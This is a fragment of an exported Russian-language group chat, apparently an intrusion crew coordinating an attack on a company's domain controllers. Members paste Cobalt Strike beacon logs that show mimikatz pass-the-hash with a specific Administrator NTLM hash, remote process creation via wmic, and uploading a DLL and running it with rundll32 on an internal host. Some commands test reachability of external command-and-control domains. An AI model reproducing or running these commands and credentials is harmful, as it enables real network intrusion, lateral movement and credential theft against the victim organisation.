+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "crx3SCfP494x9qSGm",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "наконец-то",
+      "ts": "2020-10-07T21:02:27.385Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:02:27.421Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MHrxteE9gPZxC7sYe",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "спустя тысячу лет",
+      "ts": "2020-10-07T21:02:25.413Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:02:25.458Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kL3stxtweCFASyw9J",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "всё я в датацентре",
+      "ts": "2020-10-07T21:02:21.063Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T21:02:21.091Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Mx7boAt8xKJhGzx8X",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "))",
+      "ts": "2020-10-07T20:58:31.207Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:58:31.246Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jjuEN5DAcjRDFTwWP",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "дэлка то на мою кобу",
+      "ts": "2020-10-07T20:56:20.059Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:56:20.094Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KrsvKJbWFDhZw2Weh",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "блять",
+      "ts": "2020-10-07T20:56:14.454Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:56:14.486Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "iEqa7MkfAtqnM27fc",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> pth datacenter.local\\Administrator c49d5b83342b859132197d0a73592c0e\n[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:Administrator /domain:datacenter.local /ntlm:c49d5b83342b859132197d0a73592c0e /run:\"%COMSPEC% /c echo d8c5e886568 > \\\\.\\pipe\\da5531\" command\n[+] host called home, sent: 438886 bytes\n[+] Impersonated NT AUTHORITY\\SYSTEM\n[+] received output:\nuser\t: Administrator\ndomain\t: datacenter.local\nprogram\t: C:\\Windows\\system32\\cmd.exe /c echo d8c5e886568 > \\\\.\\pipe\\da5531\nimpers.\t: no\nNTLM\t: c49d5b83342b859132197d0a73592c0e\n  |  PID  6988\n  |  TID  4548\n  |  LSA Process is now R/W\n  |  LUID 0 ; 1615963531 (00000000:6051a58b)\n  \\_ msv1_0   - data copy @ 0000006D65B9E580 : OK !\n  \\_ kerberos - data copy @ 0000006D6776F5E8\n   \\_ aes256_hmac       -> null             \n   \\_ aes128_hmac       -> null             \n   \\_ rc4_hmac_nt       OK\n   \\_ rc4_hmac_old      OK\n   \\_ rc4_md4           OK\n   \\_ des_cbc_md5       -> null             \n   \\_ des_cbc_crc       -> null             \n   \\_ rc4_hmac_nt_exp   OK\n   \\_ rc4_hmac_old_exp  OK\n   \\_ *Password replace @ 0000006D65B7B1A8 (16) -> null\n\nbeacon> shell wmic /node:10.225.10.201 process call create \"cmd /c ping stormname.com > C:\\ProgramData\\p.txt\"\n[*] Tasked beacon to run: wmic /node:10.225.10.201 process call create \"cmd /c ping stormname.com > C:\\ProgramData\\p.txt\"\n[+] host called home, sent: 126 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 3312;\n\tReturnValue = 0;\n};\n\n\nbeacon> shell type \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[*] Tasked beacon to run: type \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[+] host called home, sent: 72 bytes\n[+] received output:\n\nPinging stormname.com [104.200.67.11] with 32 bytes of data:\nReply from 104.200.67.11: bytes=32 time=51ms TTL=55\nReply from 104.200.67.11: bytes=32 time=51ms TTL=55\nReply from 104.200.67.11: bytes=32 time=51ms TTL=55\nReply from 104.200.67.11: bytes=32 time=51ms TTL=55\n\nPing statistics for 104.200.67.11:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 51ms, Maximum = 51ms, Average = 51ms\n\nbeacon> rm \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[*] Tasked beacon to remove \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[+] host called home, sent: 44 bytes\nbeacon> upload /home/user/Desktop/cobalt/dll_maker/x64.dll\n[*] Tasked beacon to upload /home/user/Desktop/cobalt/dll_maker/x64.dll as x64.dll\n[+] host called home, sent: 139699 bytes\nbeacon> shell copy x64.dll \\\\10.225.10.201\\C$\\ProgramData\\\n[*] Tasked beacon to run: copy x64.dll \\\\10.225.10.201\\C$\\ProgramData\\\n[+] host called home, sent: 75 bytes\n[+] received output:\n        1 file(s) copied.\n\nbeacon> shell wmic /node:10.225.10.201 process call create \"rundll32 C:\\ProgramData\\x64.dll entryPoint\"\n[*] Tasked beacon to run: wmic /node:10.225.10.201 process call create \"rundll32 C:\\ProgramData\\x64.dll entryPoint\"\n[+] host called home, sent: 120 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 4664;\n\tReturnValue = 0;\n};\n\n\nbeacon> shell dir \\\\10.225.10.201\\C$\\ProgramData\\x64.dll\n[*] Tasked beacon to run: dir \\\\10.225.10.201\\C$\\ProgramData\\x64.dll\n[+] host called home, sent: 73 bytes\n[+] received output:\n Volume in drive \\\\10.225.10.201\\C$ has no label.\n Volume Serial Number is 2AC9-2F68\n\n Directory of \\\\10.225.10.201\\C$\\ProgramData\n\nFile Not Found\n\n```",
+      "ts": "2020-10-07T20:54:39.234Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:54:39.449Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "W2pCB4beKfDBK93J3",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "пробую из кобы @user3 \nтоже не притягивается, хотя кобу пингует",
+      "ts": "2020-10-07T20:53:58.254Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:53:58.290Z",
+      "mentions": [
+        {
+          "_id": "5nrWYoszLFsnLuMcN",
+          "username": "user3",
+          "name": "stalin"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "QmPEDt7oSNoxZxSTJ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": ":^(",
+      "ts": "2020-10-07T20:51:14.947Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:51:14.973Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "JPRFwpZMnZfQECQii",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "чё он всех видит, меня не видит",
+      "ts": "2020-10-07T20:51:08.658Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:51:08.690Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "geqntdSYoeAoxfs7W",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nuser 2-2[AUHDC1-COPADS01]SYSTEM */5008|2020Oct07 23:48:21> shell wmic /node:10.225.10.201 process call create \"cmd /c ping passloft.com > C:\\ProgramData\\p.txt\"\n[*] Tasked beacon to run: wmic /node:10.225.10.201 process call create \"cmd /c ping passloft.com > C:\\ProgramData\\p.txt\"\n[+] host called home, sent: 125 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 464;\n\tReturnValue = 0;\n};\n\n\n[+] host called home, sent: 32 bytes\n[+] host called home, sent: 32 bytes\nuser 2-2[AUHDC1-COPADS01]SYSTEM */5008|2020Oct07 23:49:20> shell type \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[*] Tasked beacon to run: type \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[+] host called home, sent: 72 bytes\n[+] received output:\n\nPinging passloft.com [192.169.7.15] with 32 bytes of data:\nReply from 192.169.7.15: bytes=32 time=52ms TTL=55\nReply from 192.169.7.15: bytes=32 time=51ms TTL=55\nReply from 192.169.7.15: bytes=32 time=52ms TTL=55\nReply from 192.169.7.15: bytes=32 time=52ms TTL=55\n\nPing statistics for 192.169.7.15:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 51ms, Maximum = 52ms, Average = 51ms\n\nuser 2-2[AUHDC1-COPADS01]SYSTEM */5008|2020Oct07 23:49:51> rm \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[*] Tasked beacon to remove \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[+] host called home, sent: 44 bytes\n```",
+      "ts": "2020-10-07T20:50:28.015Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-07T20:50:28.257Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4xbptdbaDzKBEbNtw",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "dal",
+      "ts": "2020-10-07T20:49:12.915Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-07T20:49:12.949Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "B6r5aN3z5ZykwxkMF",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "то есть реально не проще просто дать пасс от своей кобы?",
+      "ts": "2020-10-07T20:48:47.562Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:48:47.591Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pWmLKsusXZ46LSL7H",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "вы хотите какой то листенер развернуть на ДК saiglobal.com?",
+      "ts": "2020-10-07T20:41:22.701Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:41:22.730Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "iNWw5DjEJL7w5dhXH",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "вот инициатор сейчас объяснит",
+      "ts": "2020-10-07T20:38:18.199Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:38:18.237Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "6Jjk7jXbBNe9fsoiq",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "не понял?)",
+      "ts": "2020-10-07T20:37:46.252Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:37:46.286Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "QGW3NrawqCFfn2SkE",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а если ДК saiglobal.com будет через себя трафик пропускать?",
+      "ts": "2020-10-07T20:37:12.365Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:37:12.396Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Xp4XAC8c2XdyYBSMw",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "я думаю @user1 не против",
+      "ts": "2020-10-07T20:33:37.122Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:33:37.183Z",
+      "mentions": [
+        {
+          "_id": "68GKoLCJKg5tQPT5m",
+          "username": "user1",
+          "name": "user1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "5zq5WwwynMSgotwpC",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "из .128 тогда могу с ней работать?",
+      "ts": "2020-10-07T20:32:40.878Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:32:40.908Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "n3SzyQApNWq8z9zqt",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а дает нагузку на твой адрес",
+      "ts": "2020-10-07T20:31:23.117Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:31:23.167Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XtKCtXMEhw5WqcTmA",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "т к он не через себя пропускает трафик",
+      "ts": "2020-10-07T20:31:08.438Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:31:08.475Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "f6prCpcH3mck5EYdE",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ех",
+      "ts": "2020-10-07T20:31:03.327Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:31:03.360Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "uqbmcqtZBecRsh4Ng",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "неа",
+      "ts": "2020-10-07T20:31:00.778Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:31:00.825Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cChksFnoxNXbprYkJ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "при том, что мою кобу он не видит",
+      "ts": "2020-10-07T20:31:00.410Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:31:00.438Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TEtCLhAbFfw2ayh9R",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "получится?",
+      "ts": "2020-10-07T20:30:52.610Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:30:52.642Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XacTcE7vb2vbjS6g4",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "а если он себе притянет, а потом мне заспавнит",
+      "ts": "2020-10-07T20:30:48.948Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:30:48.983Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WXucdZw58683K8CHN",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "с его кобы работать?",
+      "ts": "2020-10-07T20:30:27.500Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:30:27.541Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sde797DiGW5ptDB7q",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "+",
+      "ts": "2020-10-07T20:30:03.665Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:30:03.706Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8tsiwkFAvts8tChvF",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "коба user1 пинганулась",
+      "ts": "2020-10-07T20:28:24.215Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T20:28:24.248Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oipNNs4RvvX6hMfcd",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "проверь доступность",
+      "ts": "2020-10-07T20:01:03.353Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:01:03.377Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XqbSh5wYo2PM6qq79",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "возьми кобу коллеги",
+      "ts": "2020-10-07T20:00:55.772Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:00:55.799Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sY5hDLTyRGGmx5aYw",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ну вот и ответ)",
+      "ts": "2020-10-07T20:00:42.042Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T20:00:42.079Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TACvHweAcT99T5nsX",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell type \\\\10.225.10.201\\C$\\ProgramData\\sq.txt\n[*] Tasked beacon to run: type \\\\10.225.10.201\\C$\\ProgramData\\sq.txt\n[+] host called home, sent: 73 bytes\n[+] received output:\n\nPinging firedi.com [23.106.215.146] with 32 bytes of data:\nRequest timed out.\nRequest timed out.\nRequest timed out.\nRequest timed out.\n\nPing statistics for 23.106.215.146:\n    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),\n\n```",
+      "ts": "2020-10-07T19:57:56.469Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:57:56.592Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cuSMxrTTqpGPsWKqi",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ты же пытаешься их притянуть)",
+      "ts": "2020-10-07T19:56:26.385Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:56:26.423Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nNqZ38BfDajk7j6Go",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "пинг оттуда на твою кобу",
+      "ts": "2020-10-07T19:56:18.009Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:56:18.047Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pzcpkdG3tvYgPKFPX",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> shell ping firedi.com\n[*] Tasked beacon to run: ping firedi.com\n[+] host called home, sent: 46 bytes\n[+] received output:\n\nPinging firedi.com [23.106.215.146] with 32 bytes of data:\nReply from 23.106.215.146: bytes=32 time=70ms TTL=54\nReply from 23.106.215.146: bytes=32 time=69ms TTL=54\nReply from 23.106.215.146: bytes=32 time=68ms TTL=54\nReply from 23.106.215.146: bytes=32 time=68ms TTL=54\n\nPing statistics for 23.106.215.146:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 68ms, Maximum = 70ms, Average = 68ms\n\n```",
+      "ts": "2020-10-07T19:56:06.703Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:56:06.830Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oEhyk8gk4D6fx5chb",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "попробуй пинг на свою кобу",
+      "ts": "2020-10-07T19:54:01.934Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:54:01.974Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Mje78EMaqbr34tzfr",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "```\nbeacon> pth datacenter.local\\Administrator c49d5b83342b859132197d0a73592c0e\n[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:Administrator /domain:datacenter.local /ntlm:c49d5b83342b859132197d0a73592c0e /run:\"%COMSPEC% /c echo a8192f714f5 > \\\\.\\pipe\\da0134\" command\n[+] host called home, sent: 438886 bytes\n[+] Impersonated NT AUTHORITY\\SYSTEM\n[+] received output:\nuser\t: Administrator\ndomain\t: datacenter.local\nprogram\t: C:\\Windows\\system32\\cmd.exe /c echo a8192f714f5 > \\\\.\\pipe\\da0134\nimpers.\t: no\nNTLM\t: c49d5b83342b859132197d0a73592c0e\n  |  PID  6148\n  |  TID  4308\n  |  LSA Process is now R/W\n  |  LUID 0 ; 1594533110 (00000000:5f0aa4f6)\n  \\_ msv1_0   - data copy @ 0000006D664CBE00 : OK !\n  \\_ kerberos - data copy @ 0000006D665014C8\n   \\_ aes256_hmac       -> null             \n   \\_ aes128_hmac       -> null             \n   \\_ rc4_hmac_nt       OK\n   \\_ rc4_hmac_old      OK\n   \\_ rc4_md4           OK\n   \\_ des_cbc_md5       -> null             \n   \\_ des_cbc_crc       -> null             \n   \\_ rc4_hmac_nt_exp   OK\n   \\_ rc4_hmac_old_exp  OK\n   \\_ *Password replace @ 0000006D664D0B18 (16) -> null\n\nbeacon> shell dir \\\\10.225.10.201\\C$\\ProgramData\\\n[*] Tasked beacon to run: dir \\\\10.225.10.201\\C$\\ProgramData\\\n[+] host called home, sent: 66 bytes\n[+] received output:\n Volume in drive \\\\10.225.10.201\\C$ has no label.\n Volume Serial Number is 2AC9-2F68\n\n Directory of \\\\10.225.10.201\\C$\\ProgramData\n\n07/16/2016  09:23 AM    <DIR>          Comms\n10/06/2020  12:45 AM    <DIR>          FireEye\n10/06/2020  08:24 AM             8,192 ntuser.dat\n05/30/2019  02:57 PM    <DIR>          Package Cache\n04/24/2019  03:13 PM    <DIR>          regid.1991-06.com.microsoft\n07/16/2016  09:23 AM    <DIR>          SoftwareDistribution\n02/02/2018  03:38 PM    <DIR>          USOPrivate\n02/02/2018  03:38 PM    <DIR>          USOShared\n03/13/2019  01:10 PM    <DIR>          VMware\n               1 File(s)          8,192 bytes\n               8 Dir(s)  61,425,848,320 bytes free\n\nbeacon> shell wmic /node:10.225.10.201 process call create \"cmd /c ping google.com > C:\\ProgramData\\p.txt\"\n[*] Tasked beacon to run: wmic /node:10.225.10.201 process call create \"cmd /c ping google.com > C:\\ProgramData\\p.txt\"\n[+] host called home, sent: 123 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 5972;\n\tReturnValue = 0;\n};\n\n\nbeacon> shell type \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[*] Tasked beacon to run: type \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[+] host called home, sent: 72 bytes\n[+] received output:\n\nPinging google.com [108.177.122.100] with 32 bytes of data:\nReply from 108.177.122.100: bytes=32 time=2ms TTL=106\nReply from 108.177.122.100: bytes=32 time=1ms TTL=106\nReply from 108.177.122.100: bytes=32 time=1ms TTL=106\nReply from 108.177.122.100: bytes=32 time=2ms TTL=106\n\nPing statistics for 108.177.122.100:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 1ms, Maximum = 2ms, Average = 1ms\n\nbeacon> rm \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[*] Tasked beacon to remove \\\\10.225.10.201\\C$\\ProgramData\\p.txt\n[+] host called home, sent: 44 bytes\nbeacon> shell dir\n[*] Tasked beacon to run: dir\n[+] host called home, sent: 34 bytes\n[+] received output:\n Volume in drive C is System\n Volume Serial Number is 9AA9-9DAB\n\n Directory of C:\\ProgramData\n\n07/27/2018  07:11 AM    <DIR>          AppData\n10/06/2020  12:20 AM    <DIR>          FireEye\n02/29/2020  03:37 PM    <DIR>          GetSupportService_N-Central\n02/17/2020  02:15 PM    <DIR>          N-Able Technologies\n10/07/2020  04:09 AM           262,144 ntuser.dat\n08/23/2020  12:22 AM    <DIR>          Package Cache\n11/21/2014  08:58 PM    <DIR>          regid.1991-06.com.microsoft\n07/27/2018  07:11 AM    <DIR>          SnowSoftware\n05/19/2020  01:19 PM    <DIR>          SolarWinds MSP\n04/25/2020  12:00 AM    <DIR>          Tenable\n07/25/2020  11:30 AM    <DIR>          VMware\n10/07/2020  03:31 PM           139,680 x64.dll\n               2 File(s)        401,824 bytes\n              10 Dir(s)  24,960,004,096 bytes free\n\nbeacon> shell copy x64.dll \\\\10.225.10.201\\C$\\ProgramData\\\n[*] Tasked beacon to run: copy x64.dll \\\\10.225.10.201\\C$\\ProgramData\\\n[+] host called home, sent: 75 bytes\n[+] received output:\n        1 file(s) copied.\n\nbeacon> shell wmic /node:10.225.10.201 process call create \"rundll32 C:\\ProgramData\\x64.dll entryPoint\"\n[*] Tasked beacon to run: wmic /node:10.225.10.201 process call create \"rundll32 C:\\ProgramData\\x64.dll entryPoint\"\n[+] host called home, sent: 120 bytes\n[+] received output:\nExecuting (Win32_Process)->Create()\n\nMethod execution successful.\n\nOut Parameters:\ninstance of __PARAMETERS\n{\n\tProcessId = 6624;\n\tReturnValue = 0;\n};\n\n\nbeacon> shell dir \\\\10.225.10.201\\C$\\ProgramData\\x64.dll\n[*] Tasked beacon to run: dir \\\\10.225.10.201\\C$\\ProgramData\\x64.dll\n[+] host called home, sent: 73 bytes\n[+] received output:\n Volume in drive \\\\10.225.10.201\\C$ has no label.\n Volume Serial Number is 2AC9-2F68\n\n Directory of \\\\10.225.10.201\\C$\\ProgramData\n\nFile Not Found\n\n``` \nнихуя опять",
+      "ts": "2020-10-07T19:53:25.744Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:53:26.071Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HDBBBArZndB93Ya4Q",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "второй дк пробую",
+      "ts": "2020-10-07T19:49:40.154Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-07T19:49:40.185Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tYFY2KyLyCypygYWL",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "остальные тоже?",
+      "ts": "2020-10-07T19:46:32.189Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-07T19:46:32.237Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yasZkBtS3TDj7kZNQ",
+      "rid": "cMs2nDpvjqoP42TMf",
+      "msg": "ну 1 не притягивается",
+      "ts": "2020-10-07T19:46:29.264Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
